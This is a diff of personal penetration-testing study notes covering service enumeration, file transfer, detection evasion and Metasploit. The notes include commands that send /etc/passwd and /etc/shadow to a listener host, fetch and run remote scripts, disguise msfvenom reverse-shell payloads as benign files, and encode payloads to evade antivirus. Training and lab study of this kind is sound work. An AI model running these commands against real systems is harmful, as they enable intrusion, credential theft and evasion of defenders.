@@ -5,14 +5,18 @@
 ![image info](./images/hacking-is-our-weapon.jpg)
 
 > Hi, here will be my notes on **Penetration Testing**, **TryHackMe Rooms** and **HackTheBox Machines, Challenges, etc.** If you are looking for more specific Linux, Networking or Web related content, you could look to my other repositories:
-- ![Linux Notes](./Linux%20Notes.md)
-- ![Networking Notes](./Networking%20Notes.md)
-- ![Web Security Notes (Coming Soon)](./Web%20Security%20Notes.md)
+- **[Linux Notes](./Linux%20Notes.md)**
+- **[Networking Notes](./Networking%20Notes.md)**
+- **Web Security Notes (Coming Soon)**
+- **Active Directory Notes (Coming Not So Soon)**
+- **Windows Notes (Coming Not So Soon)**
 
-<!-- >> ![**<< Linux Notes**](./Linux%20Notes.md) **|** ![**Networking Notes>>**](./Networking%20Notes.md) -->
 # Table of Contents
 - [RECONNAISSANCE](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#reconnaissance)
-- [Domain Information](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#domain-information)
+	- [Domain Information](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#domain-information)
+	- [Nmap]()
+	- [Subdomain and Directory Enum]()
+	- [Fuzzing]()
 - [PROTOCOLS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#protocols)
 	- [FTP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#ftp)
 	- [SMB](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#smb)
@@ -38,8 +42,11 @@
 	- [Linux File Transfer](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#linux-file-transfers)
 	- [Code File Transfer](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#code-file-transfers)
 	- [Miscellaneous File Transfer Methods](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#miscellaneous-file-transfer-methods)
-	
-	
+- [DETECTION AND EVASION]()
+	- [File Transfer DaE]()
+- [METASPLOIT](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#metasploit)
+	- [MSFconsole]()
+	- [MSFvenom]()
 ---
 
 
@@ -159,6 +166,14 @@ gobuster vhost -u superkek.com -w /usr/share/seclists/Discovery/DNS/subdomains-t
 ```bash
 dirsearch -u superkek.com
 ```
+- **Ffuf Subdomain**
+```bash
+ffuf -w wordlist.txt:FUZZ -u https://FUZZ.superkek.com/`
+```
+- **Ffuf VHost**
+```bash
+ffuf -w wordlist.txt:FUZZ -u http://superkek.com:PORT/ -H 'Host: FUZZ.superkek.com' -fs xxx
+```
 
 ## Fuzzing
 ### Ffuf
@@ -231,11 +246,11 @@ In a network,using Samba, each host participates in the same `workgroup`. A work
 ### Smbclient
 **Connecting to the Share**
 ```bash
-smbclient -N -L //137.137.137.137
+smbclient -N -L //13.13.13.13
 ```
 **OR**
 ```bash
-smbclient -U username \\\\137.137.137.137\\share
+smbclient -U username \\\\13.13.13.13\\share
 ```
 
 - `-N` is for **null session**, which is anonymous access without the input user/pass. And `-L` is to list all shares.
@@ -284,15 +299,15 @@ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(p
 3. Or for the same cause you could try yo use [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py) script
 4. You could use `SMBmap tool`
 ```bash
-smbmap -H 137.137.137.137
+smbmap -H 13.13.13.13
 ```
 5. You could use `CrackMapExec`
 ```bash
-crackmapexec smb 137.137.137.137 --shares -u '' -p ''
+crackmapexec smb 13.13.13.13 --shares -u '' -p ''
 ```
 6. You could use [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
 ```bash
-./enum4linux-ng.py 137.137.137.137 -A
+./enum4linux-ng.py 13.13.13.13 -A
 ```
 ---
 
@@ -306,16 +321,16 @@ crackmapexec smb 137.137.137.137 --shares -u '' -p ''
 ### Tips2Hack
 1. Basic nmap footprinting
 ```bash  
-sudo nmap --script nfs* 137.137.137.137 -sV -p111,2049
+sudo nmap --script nfs* 13.13.13.13 -sV -p111,2049
 ```
 2. Show available NFS shares
 ```bash
-showmount -e 137.137.137.137
+showmount -e 13.13.13.13
 ```
 3. Mounting & Unmounting NFS shares
 ```bash
 > mkdir target-NFS
-> sudo mount -t nfs 137.137.137.137:/ ./target-NFS/ -o nolock
+> sudo mount -t nfs 13.13.13.13:/ ./target-NFS/ -o nolock
 > sudo umount ./target-NFS
 ```
 ---
@@ -357,11 +372,11 @@ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
 1. SSH-Audit
 ```bash
 > git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
-> ./ssh-audit.py 137.137.137.137
+> ./ssh-audit.py 13.13.13.13
 ```
 2. Change Auth Method
 ```bash
-ssh -v carnifex17@137.137.137.137 -o PreferredAuthentications=password
+ssh -v carnifex17@13.13.13.13 -o PreferredAuthentications=password
 ```
 3. If you have access to `/.ssh/authorized_keys` file, then put your **public key** inside of this file, and then you could log in without password
 4. If you have access to some **private key** you could download it and use, but check if permissions to private key is **chmod 600**
@@ -385,17 +400,17 @@ For this purpose, an extension for SMTP has been developed called Extended SMTP 
 ### Tips2Hack
 1. You can try to enumerate users via Telnet VRFY
 ```bash
-> telnet 137.137.137.137 25
+> telnet 13.13.13.13 25
 > VRFY carnifex17
 252 2.0.0 carnifex17
 ```
 2. Nmap - Open Relay
 ```bash
-sudo nmap 137.137.137.137 -p25 --script smtp-open-relay -v
+sudo nmap 13.13.13.13 -p25 --script smtp-open-relay -v
 ```
 3. SMTP - Nmap all enum
 ```bash
-sudo nmap 137.137.137.137 -p25 -sV -sC --script smtp* -v
+sudo nmap 13.13.13.13 -p25 -sV -sC --script smtp* -v
 ```
 
 ---
@@ -463,15 +478,15 @@ rsync -av --list-only rsync://127.0.0.1/dev
 1. By default, ports `110`, `143`, `993`, and `995` are used for IMAP and POP3
 2. Nmap basic footprinting
 ```bash 
-sudo nmap 137.137.137.137 -sV -p110,143,993,995 -sC
+sudo nmap 13.13.13.13 -sV -p110,143,993,995 -sC
 ```
 3. IMAP Curl List mailboxes
 ```bash
-curl -k 'imaps://137.137.137.137' --user user:p4ssw0rd
+curl -k 'imaps://13.13.13.13' --user user:p4ssw0rd
 ```
 4. OpenSSL - TLS Encypted Interaction POP3 
 ```bash
-openssl s_client -connect 137.137.137.137:pop3s
+openssl s_client -connect 13.13.13.13:pop3s
 ```
 
 ---
@@ -508,27 +523,27 @@ There are many useful and not DNS records:
 
 1. DIG - NS Query
 ```bash
-dig ns inlanefreight.kek @137.137.137.137
+dig ns inlanefreight.kek @13.13.13.13
 ```
 2. DIG - Version Query
 ```bash
-dig CH TXT version.bind 137.137.137.137
+dig CH TXT version.bind 13.13.13.13
 ```
 3. DIG - ANY Query
 ```bash
-dig any inlanefreight.kek @137.137.137.137
+dig any inlanefreight.kek @13.13.13.13
 ```
 4. DIG - AXFR Zone Transfer
 ```bash
-dig axfr inlanefreight.kek @137.137.137.137
+dig axfr inlanefreight.kek @13.13.13.13
 ```
 5. DIG - AXFR Zone Transfer - Internal  
 ```bash
-dig axfr internal.inlanefreight.kek @137.137.137.137
+dig axfr internal.inlanefreight.kek @13.13.13.13
 ```
 6. DNSEnum
 ```bash
-dnsenum --dnsserver 137.137.137.137 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.kek
+dnsenum --dnsserver 13.13.13.13 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.kek
 ```
 ---
 ## SNMP
@@ -561,11 +576,11 @@ snmpwalk -v2c -c public 10.129.14.128
 ```
 2. OneSixtyOne (`SNMP scanner`). Can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator
 ```bash
-onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 137.137.137.137
+onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 13.13.13.13
 ```
 3. Braa. Once we know a community string, we can use it with braa to brute-force the individual `OIDs` and enumerate the information behind them.
 ```bash
-> braa <community string>@137.137.137.137:.1.3.6.*
+> braa <community string>@13.13.13.13:.1.3.6.*
 ```
 
 ---
@@ -600,7 +615,7 @@ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
 
 1. Nmap Basic Footprinting
 ```bash
-sudo nmap 137.137.137.137 -sV -sC -p3306 --script mysql*
+sudo nmap 13.13.13.13 -sV -sC -p3306 --script mysql*
 ```
 ---
 
@@ -621,17 +636,17 @@ MSSQL has default system databases that can help us understand the structure of 
 
 1. Nmap MSSQL Script Scan
 ```bash
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 137.137.137.137
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 13.13.13.13
 ```
 2. Metasploit scan. We can user `mssql_ping` to get more useful info about MSSQL server.
 ```bash
-msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 137.137.137.137
+msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 13.13.13.13
 
-rhosts => 137.137.137.137
+rhosts => 13.13.13.13
 
 msf6 auxiliary(scanner/mssql/mssql_ping) > run
 
-[*] 10.129.201.248:       - SQL Server information for 137.137.137.137:
+[*] 10.129.201.248:       - SQL Server information for 13.13.13.13:
 [+] 10.129.201.248:       -    ServerName      = SQL-01
 [+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
 [+] 10.129.201.248:       -    IsClustered     = No
@@ -643,7 +658,7 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 ```
 3. Connecting with Mssqlclient.py
 ```bash
-python3 mssqlclient.py Administrator@137.137.137.137 -windows-auth
+python3 mssqlclient.py Administrator@13.13.13.13 -windows-auth
 ```
 ---
 
@@ -658,19 +673,19 @@ Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing to
 
 1. Nmap
 ```bash
-sudo nmap -p1521 -sV 137.137.137.137 --open
+sudo nmap -p1521 -sV 13.13.13.13 --open
 ```
 2. Nmap - SID Bruteforcing
 ```bash
-sudo nmap -p1521 -sV 137.137.137.137 --open --script oracle-sid-brute
+sudo nmap -p1521 -sV 13.13.13.13 --open --script oracle-sid-brute
 ```
 3. ODAT
 ```bash
-./odat.py all -s 137.137.137.137
+./odat.py all -s 13.13.13.13
 ```
 4. SQLplus - Log In
 ```bash
-sqlplus george/burger@137.137.137.137/XE
+sqlplus george/burger@13.13.13.13/XE
 ```
 5. Oracle RDBMS - Interaction
 ```bash
@@ -684,7 +699,7 @@ GEORGE                          RESOURCE                       NO  YES NO
 ```
 6. Oracle RDBMS - Database Enumeration
 ```bash
-sqlplus george/burger@137.137.137.137/XE as sysdba
+sqlplus george/burger@13.13.13.13/XE as sysdba
 SQL> select * from user_role_privs;
 -------------------------------------------------------------------------
 USERNAME                       GRANTED_ROLE                   ADM DEF OS
@@ -708,8 +723,8 @@ SQL> select name, password from sys.user$;
 ```
 8. Oracle RDBMS - File Upload
 ```bash
-./odat.py utlfile -s 137.137.137.137 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
-curl -X GET http://137.137.137.137/testing.txt
+./odat.py utlfile -s 13.13.13.13 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+curl -X GET http://13.13.13.13/testing.txt
 
 Hello There Adventurer!
 ```
@@ -793,14 +808,14 @@ sudo nmap -sU --script ipmi-version -p 623 ilo.kekmaster.local
 2. Metasploit Version Scan
 ```bash
 msf6 > use  auxiliary/scanner/ipmi/ipmi_version
-msf6 > set rhosts 137.137.137.137
+msf6 > set rhosts 13.13.13.13
 msf6 > run
 ```
 
 3. Metasploit Dumping Hashes
 ```bash
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
-msf6 > set rhosts 137.137.137.137
+msf6 > set rhosts 13.13.13.13
 msf6 > run
 ```
 
@@ -828,7 +843,7 @@ The R-commands suite contains:
 ### Tips2Hack
 1. Logging in Using Rlogin
 ```bash
-rlogin 137.137.137.137 -l htb-student
+rlogin 13.13.13.13 -l htb-student
 ```
 2. Listing Authenticated Users Using Rwho
 ```bash
@@ -836,7 +851,7 @@ rwho
 ```
 3. Listing Authenticated Users Using Rusers
 ```bash
-rusers -al 137.137.137.137
+rusers -al 13.13.13.13
 ```
 
 ---
@@ -848,15 +863,15 @@ rusers -al 137.137.137.137
 ### TIps2Hack
 1. Nmap
 ```bash
-nmap -sV -sC 137.137.137.137 -p3389 --script rdp*
+nmap -sV -sC 13.13.13.13 -p3389 --script rdp*
 ```
 2. [RDP Security Check](https://github.com/CiscoCXSecurity/rdp-sec-check)
 ```bash
-./rdp-sec-check.pl 137.137.137.137
+./rdp-sec-check.pl 13.13.13.13
 ```
 3. Initiate an RDP Session via xfreerdp(or Reminna with GUI)
 ```bash
-xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:137.137.137.137 /cert:ignore /d:DOMAIN
+xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:13.13.13.13 /cert:ignore /d:DOMAIN
 ```
 
 ---
@@ -867,11 +882,11 @@ xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:137.137.137.137 /cert:ignore /d:DOMAIN
 ### Tips2Hack
 1. Nmap WinRM
 ```bash
-nmap -sV -sC 137.137.137.137 -p5985,5986 --disable-arp-ping -n
+nmap -sV -sC 13.13.13.13 -p5985,5986 --disable-arp-ping -n
 ```
 2. Evil-WinRM
 ```bash
-evil-winrm -i 137.137.137.137 -u carnifex17 -p S3cr3t!
+evil-winrm -i 13.13.13.13 -u carnifex17 -p S3cr3t!
 ```
 
 ## WMI
@@ -879,7 +894,7 @@ evil-winrm -i 137.137.137.137 -u carnifex17 -p S3cr3t!
 ### Tips2Hack
 1. WMIexec.py
 ```bash
-/usr/share/doc/python3-impacket/examples/wmiexec.py carnifex17:"S3cr3t!"@137.137.137.137 "hostname"
+/usr/share/doc/python3-impacket/examples/wmiexec.py carnifex17:"S3cr3t!"@13.13.13.13 "hostname"
 
 ```
 
@@ -987,13 +1002,13 @@ python3 -m uploadserver
 1. **PowerShell Script to Upload a File to Python Upload Server**
 ```powershell
 PS C:\carnifex17> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-PS C:\carnifex17> Invoke-FileUpload -Uri http://137.137.137.137:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+PS C:\carnifex17> Invoke-FileUpload -Uri http://13.13.13.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
 
 2. **PowerShell Base64 Web Upload**. Convert file to base64 and send it using Invoke-WebRequest with POST method. 
 ```powershell
 PS C:\carnifex17> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-PS C:\carnifex17> Invoke-WebRequest -Uri http://137.137.137.137:8000/ -Method POST -Body $b64
+PS C:\carnifex17> Invoke-WebRequest -Uri http://13.13.13.13:8000/ -Method POST -Body $b64
 ```
 ```bash
 nc -lvnp 8000
@@ -1033,12 +1048,12 @@ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
 2. **Connecting to the Webdav Share**. DavWWWRoot isn't a folder, it's a special keyword that tells WebDAV that we are connection to the root of WebDav server. You could use any existing directory when you are connecting, as example `sharefolder`
 ```powershell
-C:\carnifex17> dir \\137.137.137.137\DavWWWRoot
+C:\carnifex17> dir \\13.13.13.13\DavWWWRoot
 ```
 3. **Uploading Files using SMB**
 ```powershell
-C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\137.137.137.137\DavWWWRoot\
-C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\137.137.137.137\sharefolder\
+C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\DavWWWRoot\
+C:\carnifex17> copy C:\Users\john\Desktop\SourceCode.zip \\13.13.13.13\sharefolder\
 ```
 
 ### FTP Downloads
@@ -1052,17 +1067,17 @@ sudo python3 -m pyftpdlib --port 21
 ```
 2. **Transferring Files from an FTP Server Using Powershell**
 ```powershell
-PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('ftp://137.137.137.137/file.txt', 'C:\Users\Public\ftp-file.txt')
+PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('ftp://13.13.13.13/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 3. **Create a Command File for the FTP Client and Download the Target File**
 ```bash
-C:\carnifex17> echo open 137.137.137.137 > ftpcommand.txt
+C:\carnifex17> echo open 13.13.13.13 > ftpcommand.txt
 C:\carnifex17> echo USER anonymous >> ftpcommand.txt
 C:\carnifex17> echo binary >> ftpcommand.txt
 C:\carnifex17> echo GET file.txt >> ftpcommand.txt
 C:\carnifex17> echo bye >> ftpcommand.txt
 C:\carnifex17> ftp -v -n -s:ftpcommand.txt
-ftp> open 137.137.137.137
+ftp> open 13.13.13.13
 Log in with USER and PASS first.
 ftp> USER anonymous
 
@@ -1081,7 +1096,7 @@ sudo python3 -m pyftpdlib --port 21 --write
 ```
 2. **Powershell Upload File**
 ```powershell
-PS C:\carnifex17> (New-Object Net.WebClient).UploadFile('ftp://137.137.137.137/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+PS C:\carnifex17> (New-Object Net.WebClient).UploadFile('ftp://13.13.13.13/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 3. **Create a Command File for the FTP Client to Upload a File**
 ```powershell
@@ -1148,7 +1163,7 @@ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
 ```
 - **Upload Multiple Files**
 ```bash
-curl -X POST https://137.137.137.137/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+curl -X POST https://13.13.13.13/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 #### Alternative File Transfer Method
 - **Creating a Web Server with Python3**
@@ -1180,7 +1195,7 @@ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | ba
 ### Download with Bash(/dev/tcp)
 1. **Connect to the Target Webserver**
 ```bash
-exec 3<>/dev/tcp/10.10.10.32/80
+exec 3<>/dev/tcp/13.13.13.13/80
 ```
 2. **HTTP GET Request**
 ```bash
@@ -1230,7 +1245,7 @@ python3 -m uploadserver
 ```
 1. **Uploading a File Using a Python One-liner**
 ```bash
-python3 -c 'import requests;requests.post("http://137.137.137.137:8000/upload",files={"files":open("/etc/passwd","rb")})'
+python3 -c 'import requests;requests.post("http://13.13.13.13:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 1. **Oneliner in few lines for better understanding**
 ```python
@@ -1238,7 +1253,7 @@ python3 -c 'import requests;requests.post("http://137.137.137.137:8000/upload",f
 import requests 
 
 # Define the target URL where we will upload the file.
-URL = "http://137.137.137.137:8000/upload"
+URL = "http://13.13.13.13:8000/upload"
 
 # Define the file we want to read, open it and save it in a variable.
 file = open("/etc/passwd","rb")
@@ -1375,8 +1390,8 @@ PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destin
 ```
 
 # Detection and Evasion
-## File Transfer Detection
-**A lot of SIEM (Security Information and Event Management) are  checking `user-agents` to detect sus traffic.** But `user-agents` are not inly used to identify web browsers, but anything acting as HTTP client and connecting to a web server via HTTP can have user agent string(like `cURL`, custom `Python` script or common tools like `sqlmap` and `nmap`). So File transfers could be detected. 
+## File Transfer DaE
+**A lot of SIEM (Security Information and Event Management) are  checking    ** `user-agents` **to detect sus traffic.** But `user-agents` are not only used to identify web browsers, but anything acting as HTTP client and connecting to a web server via HTTP can have user agent string (like `cURL`, custom `Python` script or common tools like `sqlmap` and `nmap`). So File transfers could be detected. 
 ### Evasion Techniques
 #### Changing User Agent:
 1. **Listing out User Agents**
@@ -1386,11 +1401,150 @@ PS C:\carnifex17>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | S
 2. **Request with Chrome User Agent**
 ```powershell
 PS C:\carnifex17> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-PS C:\carnifex17> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+PS C:\carnifex17> Invoke-WebRequest http://13.13.13.13/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 #### LOLBAS / GTFOBins
 Application whitelisting may prevent you from using PowerShell or Netcat, but not from using `Living Off the Land` Binaries. As example LOLBIN is the Intel Graphics Driver for Windows 10(GfxDownloadWrapper.exe), which could be used to file transfer
 1. **Transferring File with GfxDownloadWrapper.exe**
 ```powershell
-PS C:\carnifex17> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+PS C:\carnifex17> GfxDownloadWrapper.exe "http://13.13.13.13/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+---
+
+# Metasploit
+
+The `Metasploit Project` is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The `Metasploit Framework` includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the `Metasploit Project` is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development. Files usually located at `/usr/share/metasploit-framework`.
+
+- **What is MS Module?**
+A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.
+
+## Architecture
+
+1. **Auxiliary** - Any supporting module, such as scanners, crawlers and fuzzers.
+2. **Encoders** - Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. 
+3. **Evasion** - While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
+4. **Exploits** - Exploits, neatly organized by target system.
+5. **NOPs** -  `(No Operation code)` Keep the payload sizes consistent across exploit attempts.
+6. **Payloads** - Payloads are codes that will run on the target system.
+7. **Post** - Post modules would be useful in post-exploitation.
+ 
+## Useful MSFconsole Commands
+
+- **Specific Search**
+```bash
+msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
+```
+
+- **Get more info about module**
+```bash
+info
+```
+
+- **MSF - Permanent Target Specification**
+```bash
+msf6 exploit(windows/smb/amogus) > setg RHOSTS 13.13.13.13
+```
+
+- **Show and Set Target for exploit**
+```bash
+msf6 exploit(windows/browser/goose) > show targets
+...
+msf6 exploit(windows/browser/goose) > set target 3
+```
+
+- **Searching for Specific Payload**
+```bash
+msf6 exploit(windows/smb/goose) > grep meterpreter grep reverse_tcp show payloads
+```
+
+- **Use Local Exploit Suggester**
+```bash
+msf6 > search local exploit suggester
+```
+## MSFvenom
+
+**Msfvenom is a tool that is part of the Metasploit framework and it is a command line tool for generating different types of payloads for exploiting.** In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt & encode` payloads to bypass common anti-virus detection signatures.
+- **List Payloads**
+```bash
+msfvenom -l payloads
+```
+- **Building a Stageless Payload for Linux**
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f elf > createbackup.elf
+```
+- **Building a Stageless Payload for Windows**
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+```
+
+### Staged vs Stageless Payloads
+**`Staged` payloads create a way for us to send over more components of our attack.** So if more simply, the whole payload has few stages, first to get connection and others to load additional programs
+
+**`Stageless` payloads do not have a stage.** So all payload and programs are loaded at first time.
+
+## Meterpreter
+
+`The Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.
+
+## Encoder
+
+- **Generating Payload - With Encoding**
+
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+```
+
+- **List Encoders**
+
+```bash
+msf6 exploit(windows/smb/goose) > show encoders
+```
+
+- **MSF - VirusTotal**
+
+```bash
+msf-virustotal -k <API key> -f TeamViewerInstall.exe
+```
+
+## Sessions
+
+- **Listing Active Sessions**
+
+```bash
+msf6 exploit(windows/smb/goose) > sessions
+```
+
+- **Interacting with a Session**
+
+```bash
+msf6 exploit(windows/smb/goose) > sessions -i 1
+```
+
+- **Backgrounding session**
+
+```bash
+meterpreter > background
+OR
+Ctrl+Z
+OR
+meterpreter > bg
+```
+
+- **Killing session**
+
+```bash
+msf6 exploit(windows/smb/goose) > sessions -k 1
+```
+
+- **Listing Running Jobs**
+
+```bash
+msf6 exploit(multi/handler) > jobs -l
+```
+
+- **Run an Exploit as a Background Job**
+
+```bash
+msf6 exploit(multi/handler) > exploit -j
 ```
